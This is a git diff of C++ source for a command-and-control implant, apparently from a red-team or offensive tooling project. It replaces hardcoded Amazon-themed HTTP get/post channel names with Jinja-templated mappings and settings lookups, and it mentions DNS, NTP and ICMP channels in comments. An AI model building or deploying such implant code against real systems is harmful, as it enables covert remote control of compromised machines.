@@ -12,6 +12,8 @@ Required Keys:
 #include "../protocols/json/json.h"
 #include "../data/msgpack/msgpack.h"
 #include "../lifecycle/comms.h" //comms has all the funcs for comms
+#include "control/settings.h"
+
 // ======================================================================================
 // 0. STATIC MEMBER DEFINITIONS
 // ======================================================================================
@@ -24,30 +26,30 @@ std::map<std::string, EgressFunc> C2Implant::s_egress_map;
 
 //jinja this
 void C2Implant::init() {
-    {# // Mapping Enums to Functions
-    s_ingress_map["http_get_amazon"] = get; //temp hardcode
-    //s_ingress_map["dns_get_amazon"] = get_DNS;
+    //Init C2. This is effectively the "entry point" going forward with any c2 ops. 
 
-    s_egress_map["http_post_amazon"] = post; //temp hardcode
-
-    //s_egress_map["ntp_post_profile1"] = post_NTP;
-    //s_egress_map["icmp_post_profile1"] = post_ICMP; #}
-    [%- for c2_get_profile in c2_get_profile_map_list %]
-    s_ingress_map["{{ c2_get_profile.key }}"] = {{ c2_get_profile.value }};
+    [%- for c2_get_profile in get_function_mappings.values() %]
+    s_ingress_map["[[ c2_get_profile.key ]]"] = [[ c2_get_profile.value ]];
     [%- endfor %]
 
 
-    [%- for c2_post_profile in c2_post_profile_map_list %]
-    s_egress_map["{{ c2_post_profile.key }}"] = {{ c2_post_profile.value }};
+    [%- for c2_post_profile in post_function_mappings.values() %]
+    s_egress_map["[[ c2_post_profile.key ]]"] = [[ c2_post_profile.value ]];
     [%- endfor %]
 
+    //set default options
+    SettingsManager::instance().set("comms_get_function", "[[ init_get_function]]");
+    SettingsManager::instance().set("comms_post_function", "[[ init_post_function]]");
 }
 
 int C2Implant::register_implant() {
 
     //Note: edit this to pull from settings for each loop, on the get/post method. jinja will preset those settings.
     std::cout << "[*] Using Hardcoded get Strategy" << std::endl;
-    std::string get = "http_get_amazon";
+    //std::string get = "http_get_amazon";
+    std::string get = SettingsManager::instance().get<std::string>("comms_get_function", "");
+
+    //guard if not ..., exit
 
     // Get the strategy
     if (s_ingress_map.find(get) == s_ingress_map.end()) {
@@ -76,8 +78,8 @@ void C2Implant::cycle() {
     std::cout << "[*] Using Hardcoded get Strategy" << std::endl;
     std::cout << "[*] Using Hardcoded post Strategy" << std::endl;
 
-    std::string get = "http_get_amazon";
-    std::string post = "http_post_amazon";
+    std::string get = SettingsManager::instance().get<std::string>("comms_get_function", "");
+    std::string post = SettingsManager::instance().get<std::string>("comms_post_function", "");
 
     while (true) {
         // 1. Check for Strategy Existence
